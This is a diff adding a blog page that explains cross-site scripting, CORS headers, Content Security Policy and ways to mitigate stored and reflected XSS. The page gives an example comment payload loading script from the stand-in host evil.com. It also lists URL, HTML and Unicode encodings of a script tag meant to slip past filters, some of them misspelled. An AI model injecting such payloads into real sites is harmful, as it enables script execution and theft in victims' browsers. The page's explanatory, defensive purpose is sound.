@@ -1,0 +1,157 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>What is XSS and how to mitigate it || Fritz Stelluto</title>
+  <meta name="author" content="gotofritz">
+  <meta name="description" content="Cross Site Scripting (XSS) is a vulnerability which allows an attacker to run malicious code, typically javascript, in a victim&amp;#39;s browser or other app which can run it.">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <link href="/assets/favicon.ico" rel="shortcut icon">
+  <link rel="icon" href="/assets/favicon.gif" type="image/gif" />
+  <link href="/assets/css/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+</head>
+
+<body ontouchstart="">
+  <header id="header" class="inner">
+    <nav id="main-nav">
+      <div>
+        <a href="/">home</a>
+        <a href="/blog/">blog</a>
+      </div>
+    </nav>
+
+    <nav id="sub-nav" class="alignright">
+      <form class="search" action="http://google.com/search" method="get">
+        <input class="alignright" type="text" name="q" results="0">
+        <input type="hidden" name="q" value="site:gotofritz.net">
+      </form>
+    </nav>
+  </header>
+
+
+<div id="content" class="inner">
+  <article class="post">
+    <h1 class="title">What is XSS and how to mitigate it</h1>
+    <div>
+      <div class="meta">
+        <div class="date">
+          <time datetime="2017-08-29T13:44:00+02:00" pubdate>2017-08-29</time>
+        </div>
+        <div class="tags">
+          security,
+          frontend
+        </div>
+      </div>
+      <div class="entry-content">
+    
+<p>Cross Site Scripting (XSS) is a vulnerability which allows an attacker to run malicious code, typically javascript, in a victim&#39;s browser or other app which can run it.<!--more--></p>
+<h2 id="what-is-a-cross-site-scripting-attack-">What is a Cross Site Scripting attack?</h2>
+<p>The &quot;cross site&quot; part comes because the malicious code lives in the attacker&#39;s server (or a third party the attacker has access to). There are two ways an attacker can inject malicious code into a target machine: by submitting it to sites that accept user content like comments, etc (<strong>stored XSS</strong>), or by creating malicious URLs which when browsed to, trigger the attack (<strong>reflected XSS</strong>).</p>
+<p>Typically malicious code includes some trick to include a script tag with the code that does the damage</p>
+<pre><code>&lt;script src=&quot;http://evil.com/oh-dear.js&quot;&gt;&lt;/script&gt; Just an innocent comment...
+</code></pre><p>To defuse the attacks, code and links need to be sanitised.</p>
+<h3 id="can-code-from-different-domains-be-run-in-a-web-page-and-why-">Can code from different domains be run in a web page? And why?</h3>
+<p>Yes. This is <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS">Cross-Origin Resource Sharing (CORS)</a> and there are good reasons for it.</p>
+<p>People want to import third party code into their sites - the classic example is Google Analytics. Or they want to use versions of popular libraries stored in a <abbr title="Content Delivery Network">CDN</a> (think JQuery, hosted on //code.jquery.com/), hoping that your visitor will have it already in their cache by the time they visit your site. Or, for sites still using HTTP 1, they want to put their assets on different subdomain, because a browser only downloads a limited amount of files in parallel from the same domain (think Yahoo, who put all their assets on //s.yimg.com). Or a global website with a variety of localised subdomains (think amazon.de, amazon.fr ... all downloading scripts from amazon.com). Or while developing, they want to download assets from the live site (say www.example.com) while developing on a subdomain (new-version.example.com)</p>
+<h3 id="can-you-control-which-domain-dowloads-which-scripts-">Can you control which domain dowloads which scripts?</h3>
+<p>There is an http header which you can set in your server, Access-Control-Allow-Origin, to control who can download <em>your</em> assets. This is universally supported, and prevents third parties from accessing your scripts directly via a browser (but of course they can just download them in other ways), but it doesn&#39;t protect from XSS attacks in most cases, as you can&#39;t set the headers in the attacker&#39;s server.</p>
+<p>What you really want is the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy (CSP)</a>, which tells the browser what domains are allowed to be included in a page. This is relatively new and browser support is not quite there yet.</p>
+<h2 id="stored-xss-file-upload-displayed-in-an-iframe">Stored XSS: File Upload displayed in an iframe</h2>
+<p>When a site allows users to upload files which are then displayed to other users in an iframe, an attacker could upload an HTML file with a script tag inside</p>
+<pre><code>This is my cool HTML page &lt;script&gt;&lt;!--
+... here I can do evil things ...
+--&gt;&lt;/script&gt;
+</code></pre><p>This is a relatively simple attack to mitigate. Since you control the server where the malicious code is stored, you can simply make sure the uploaded documents are saved on a separate subdomain, say <code>user-content.example.com</code>, and then it won&#39;t have access to content on the main domain.</p>
+<h2 id="reflected-xss">Reflected XSS</h2>
+<p>The classic reflected XSS attack tries to add a script tag to a url: <code>https://example.com/&lt;script&gt;..evil.. &lt;/script&gt;</code>. Of course the attach will never be so blatant. But browsers and other apps can do substitutions for special characters. Although these days they have built-in protection for most cases, it&#39;s interesting to know what we are being protected against. And anyway, some day you may find yourself coding for an environment where it doesn&#39;t exist</p>
+<dl class="code-breakdown">
+  <dt>example.com/%3cscritpt%3e</dt>
+  <dd>URL % encoding</dd>
+
+  <dt>example.com/%253cscritpt%253e</dt>
+  <dd>double URL % encoding</dd>
+
+  <dt>example.com/%c0%bcscript%c0%be</dt>
+  <dd>bad UTF-8 encoding</dd>
+
+  <dt>example.com/%26lt;script%26gt;</dt>
+  <dd>HTML encoding</dd>
+
+  <dt>example.com/%26amp;lt;script%26amp;gt;</dt>
+  <dd>double HTML encoding</dd>
+
+  <dt>example.com/\074script\076</dt>
+  <dd>ASCII encoding</dd>
+
+  <dt>example.com/\x3cscritpt\x3E</dt>
+  <dd>ASCII encoding with hexadecimal</dd>
+
+  <dt>example.com/\u003cscritpt\u003e</dt>
+  <dd>ASCII encoding with unicode</dd>
+
+  <dt>example.com/+AD4-script+ADw-</dt>
+  <dd>a C style encoding</dd>
+
+  <dt>...</dt>
+  <dd></dd>
+
+</dl>
+
+
+
+
+
+
+
+      </div>
+    </div>
+  </article>
+
+
+<!-- <section id="comment">
+    <h1 class="title">Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</section>
+
+  </div>
+  -->
+  <footer id="footer" class="inner">Copyright &copy; 2016
+
+    Fritz Stelluto
+
+</footer>
+<!--
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
+<script type="text/javascript">
+      var disqus_shortname = 'goto-fritz';
+
+
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://gotofritz.net/blog/geekery/backing-up-hard-disk-os-x/';
+        var disqus_url = 'http://gotofritz.net/blog/geekery/backing-up-hard-disk-os-x/';
+        var disqus_script = 'embed.js';
+
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+-->
+
+
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-11254155-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+</body>
+</html>
